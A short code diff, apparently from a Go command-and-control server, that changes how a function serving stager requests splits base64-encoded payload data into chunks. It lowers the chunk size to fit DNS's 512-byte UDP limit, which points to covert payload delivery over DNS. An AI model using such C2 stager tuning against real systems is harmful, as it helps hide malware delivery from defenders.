@@ -1441,8 +1441,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		logf("[C2] Base64 encoded: %d bytes", len(base64Data))
 	}
 
-	// Split into chunks (403 bytes - tested maximum for DNS infrastructure)
-	const chunkSize = 403
+	// Split into chunks (370 bytes - DNS-safe for 512-byte UDP limit)
+	const chunkSize = 370
 	var chunks []string
 	for i := 0; i < len(base64Data); i += chunkSize {
 		end := i + chunkSize
